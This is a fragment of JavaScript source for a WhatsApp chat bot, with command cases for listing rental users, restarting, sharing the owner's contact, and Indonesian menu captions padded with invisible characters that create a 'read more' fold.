let user = [... new Set([...global.conns.filter(XeonBotInc => XeonBotInc.user).map(XeonBotInc => XeonBotInc.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await XeonBotInc.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
XeonBotInc.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcxeon(`Belum ada pengguna yang menyewa bot`)
}
break
case 'restart':
if (!XeonTheCreator) return XeonStickOwner()
replygcxeon(`restarting danzz bot`)
replygcxeon(`Done ✅`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await XeonBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
XeonBotInc.sendMessage(from, { text : `Hallo @${sender.split("@")[0]}, Ini pemilikku yang ganteng dan cantik 🐦`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu': {
await loading()
cptmenu = ` Hi ${pushname}  👋 
*ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴅᴀꜱʜʙᴏᴀʀᴅ ʙᴏᴛ ᴋᴀᴍɪ*!
- *ᴋᴀᴍɪ ʙᴇʀʜᴀʀᴀᴘ ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴɪᴋᴍᴀᴛɪ ᴘᴇɴɢᴀʟᴀᴍᴀɴ* ʙᴇʀɪɴᴛᴇʀᴀᴋꜱɪ ᴅᴇɴɢᴀɴ ʙᴏᴛ ᴋᴀᴍɪ ʏᴀɴɢ ʀᴀᴍᴀʜ ᴅᴀɴ ɪɴᴛᴜɪᴛɪꜰ.‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
- *ᴋᴀᴍɪ ᴛᴇʟᴀʜ ᴍᴇɴʏᴇʀᴛᴀᴋᴀɴ ʙᴇʀʙᴀɢᴀɪ ꜰɪᴛᴜʀ* ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴍᴇɴɢᴇʟᴏʟᴀ ᴅᴀɴ ᴍᴇɴɪɴɢᴋᴀᴛᴋᴀɴ ᴋɪɴᴇʀᴊᴀ ʙᴏᴛ ᴀɴᴅᴀ.
- *ᴋᴀᴍɪ ʙᴇʀʜᴀʀᴀᴘ ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴɪᴋᴍᴀᴛɪ* ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴅᴀꜱʜʙᴏᴀʀᴅ ʙᴏᴛ ᴋᴀᴍɪ ᴅᴀɴ ꜱᴇᴍᴏɢᴀ ᴀɴᴅᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴍᴀɴꜰᴀᴀᴛ ᴅᴀʀɪ ꜰɪᴛᴜʀ-ꜰɪᴛᴜʀ ʏᴀɴɢ ᴋᴀᴍɪ ᴛᴀᴡᴀʀᴋᴀɴ.
*[ ᴍᴇɴᴜ ]*
*.ꜱɪᴍᴘʟᴇᴍᴇɴᴜ*
*.ᴀʟʟᴍᴇɴᴜ*`
XeonBotInc.sendMessage(m.chat, { image: { url: `${global.fotomenu}`}, caption: cptmenu}, {quoted: m})
}
break
 case 'simplemenu' : {
	       let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            xeonezy = `𝙃𝙞 : _${pushname}_🍃
 ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎